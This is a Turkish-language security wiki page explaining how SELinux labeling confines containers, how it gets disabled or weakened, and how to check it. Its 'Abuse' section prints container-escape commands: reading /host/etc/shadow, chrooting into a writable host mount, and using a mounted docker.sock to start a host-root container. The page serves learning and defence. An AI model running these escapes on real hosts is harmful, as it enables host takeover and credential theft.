# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## AppArmor Vs SELinux

En temel düzeydeki en kolay fark, AppArmor'un path-based, SELinux'in ise **label-based** olmasıdır. Bunun container security açısından önemli sonuçları vardır. Path-based bir policy, aynı host içeriği beklenmeyen bir mount path altında görünür hâle geldiğinde farklı davranabilir. Label-based bir policy ise nesnenin label'ının ne olduğunu ve process domain'inin bu nesne üzerinde ne yapabileceğini değerlendirir. Bu, SELinux'i basit hâle getirmez; ancak AppArmor-based sistemlerde defender'ların bazen yanlışlıkla yaptığı path-trick varsayımlarına karşı daha dayanıklı olmasını sağlar.

Model label odaklı olduğundan, container volume yönetimi ve relabeling kararları security açısından kritik öneme sahiptir. Runtime veya operator, "mount'ların çalışmasını sağlamak" için label'ları gereğinden geniş şekilde değiştirirse workload'u containment altında tutması gereken policy boundary amaçlanandan çok daha zayıf hâle gelebilir.

## Lab

Host üzerinde SELinux'in aktif olup olmadığını görmek için:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Host üzerindeki mevcut etiketleri incelemek için:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Etiketlemenin devre dışı bırakıldığı çalıştırmayla normal çalıştırmayı karşılaştırmak için:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux etkin bir host üzerinde bu, oldukça pratik bir gösterimdir; çünkü beklenen container domain'i altında çalışan bir workload ile bu enforcement katmanı kaldırılmış bir workload arasındaki farkı gösterir.

## Runtime Usage

Podman, SELinux'un platform varsayılanının bir parçası olduğu sistemlerde SELinux ile özellikle iyi uyum sağlar. Rootless Podman ile SELinux birleşimi, en güçlü mainstream container baseline'larından biridir; çünkü process host tarafında zaten unprivileged durumdadır ve yine de MAC policy tarafından kısıtlanır. Docker da desteklenen ortamlarda SELinux kullanabilir, ancak yöneticiler volume-labeling sorunlarını aşmak için bazen SELinux'u devre dışı bırakır. CRI-O ve OpenShift, container isolation yaklaşımının bir parçası olarak büyük ölçüde SELinux'a güvenir. Kubernetes de SELinux ile ilgili ayarları sunabilir, ancak bunların değeri açıkça node OS'nin gerçekten SELinux'u destekleyip enforce edip etmediğine bağlıdır.<sup>[[2]](#references)</sup>

Tekrarlanan ders şudur: SELinux isteğe bağlı bir süs değildir. SELinux etrafında oluşturulan ecosystem'lerde beklenen security boundary'nin bir parçasıdır.

## Misconfigurations

Klasik hata `label=disable` kullanmaktır. Operasyonel olarak bu genellikle bir volume mount reddedildiği ve en hızlı kısa vadeli çözümün labeling modelini düzeltmek yerine SELinux'u denklemden çıkarmak olduğu için gerçekleşir.<sup>[[1]](#references)</sup> Bir diğer yaygın hata, host içeriğinin yanlış şekilde relabel edilmesidir. Geniş kapsamlı relabel işlemleri application'ın çalışmasını sağlayabilir, ancak container'ın erişmesine izin verilen alanı başlangıçta amaçlanandan çok daha fazla genişletebilir.

**installed** SELinux ile **effective** SELinux'u birbirine karıştırmamak da önemlidir. Bir host SELinux'u destekleyebilir ve yine de permissive mode'da olabilir ya da runtime workload'u beklenen domain altında başlatmıyor olabilir. Bu durumlarda protection, documentation'ın ima edebileceğinden çok daha zayıftır.

## Abuse

SELinux workload için mevcut değilse, permissive durumdaysa veya geniş kapsamlı şekilde devre dışı bırakılmışsa, host-mounted path'ler abuse edilmeye çok daha açık hale gelir. Aksi durumda label'lar tarafından kısıtlanacak olan aynı bind mount, host data'sına veya host üzerinde değişiklik yapmaya doğrudan bir yol haline gelebilir. Bu durum özellikle writable volume mount'ları, container runtime directory'leri veya kolaylık sağlamak için hassas host path'lerini açığa çıkaran operational shortcut'larla birleştirildiğinde önem kazanır.

SELinux çoğu zaman generic bir breakout writeup'ın bir host üzerinde hemen çalışırken, runtime flag'leri benzer olmasına rağmen başka bir host üzerinde tekrar tekrar başarısız olmasının nedenini açıklar. Eksik olan bileşen çoğu zaman bir namespace veya capability değil, intact kalan bir label boundary'dir.

En hızlı pratik kontrol, active context'i karşılaştırmak ve ardından normalde label-confined olması gereken mounted host path'lerini veya runtime directory'lerini probe etmektir:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Bir host bind mount mevcutsa ve SELinux etiketleme devre dışı bırakılmış veya zayıflatılmışsa, genellikle ilk olarak bilgi ifşası gerçekleşir:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
mount yazılabilir durumdaysa ve container, kernel açısından fiilen host-root ise, sonraki adım tahminde bulunmak yerine kontrollü host değişikliği test etmektir:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux destekli host'larda, runtime state directories çevresindeki etiketlerin kaybedilmesi, doğrudan privilege-escalation yollarını da açığa çıkarabilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Bu komutlar tam bir escape chain'in yerini tutmaz, ancak host data access veya host-side file modification işlemlerini engelleyen şeyin SELinux olup olmadığını çok hızlı bir şekilde netleştirir.

### Full Example: SELinux Disabled + Writable Host Mount

SELinux labeling devre dışıysa ve host filesystem `/host` konumuna writable olarak mount edilmişse, tam bir host escape normal bir bind-mount abuse case haline gelir:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot` başarılı olursa, container process artık host filesystem üzerinden çalışır:
```bash
id
hostname
cat /etc/passwd | tail
```
### Tam Örnek: SELinux Devre Dışı + Runtime Directory

İş yükü, etiketler devre dışı bırakıldığında bir runtime socket'ine erişebiliyorsa, escape runtime'a devredilebilir:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
İlgili gözlem, SELinux'un genellikle tam olarak bu tür host-path veya runtime-state erişimini engelleyen kontrol olmasıdır.

## Kontroller

SELinux kontrollerinin amacı, SELinux'un etkin olduğunu doğrulamak, mevcut security context'i belirlemek ve ilgilendiğiniz dosya veya yolların gerçekten label-confined olup olmadığını görmektir.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Burada ilginç olanlar:

- `getenforce` ideal olarak `Enforcing` döndürmelidir; `Permissive` veya `Disabled`, tüm SELinux bölümünün anlamını değiştirir.
- Mevcut process context beklenmedik veya gereğinden geniş görünüyorsa workload, amaçlanan container policy altında çalışmıyor olabilir.
- Host tarafından mount edilmiş dosyaların veya runtime dizinlerinin process tarafından gereğinden serbest şekilde erişilebilen label'lara sahip olması, bind mount'ları çok daha tehlikeli hâle getirir.

SELinux destekli bir platformda container incelerken labeling'i ikincil bir ayrıntı olarak değerlendirmeyin. Çoğu durumda host'un henüz compromise edilmemesinin ana nedenlerinden biridir.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Host'a bağlı | SELinux etkin host'larda SELinux separation kullanılabilir, ancak kesin davranış host/daemon configuration'a bağlıdır | `--security-opt label=disable`, bind mount'ların geniş kapsamlı yeniden label'lanması, `--privileged` |
| Podman | SELinux host'larında genellikle etkin | Devre dışı bırakılmadığı sürece SELinux separation, SELinux sistemlerinde Podman'ın normal bir parçasıdır | `--security-opt label=disable`, `containers.conf` içinde `label=false`, `--privileged` |
| Kubernetes | Genellikle Pod seviyesinde otomatik olarak atanmaz | SELinux desteği vardır, ancak Pod'lar genellikle `securityContext.seLinuxOptions` veya platforma özgü varsayılanlara ihtiyaç duyar; runtime ve node desteği gereklidir | zayıf veya geniş kapsamlı `seLinuxOptions`, permissive/disabled node'larda çalışma, labeling'i devre dışı bırakan platform policy'leri |
| CRI-O / OpenShift style deployments | Genellikle yoğun şekilde kullanılır | SELinux, bu ortamlardaki node isolation model'inin çoğunlukla temel bir parçasıdır | Erişimi aşırı genişleten custom policy'ler, uyumluluk için labeling'in devre dışı bırakılması |

SELinux varsayılanları, seccomp varsayılanlarına göre distribution'a daha fazla bağlıdır. Fedora/RHEL/OpenShift-style sistemlerde SELinux, isolation model'inin çoğunlukla merkezindedir. SELinux olmayan sistemlerde ise tamamen yoktur.

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
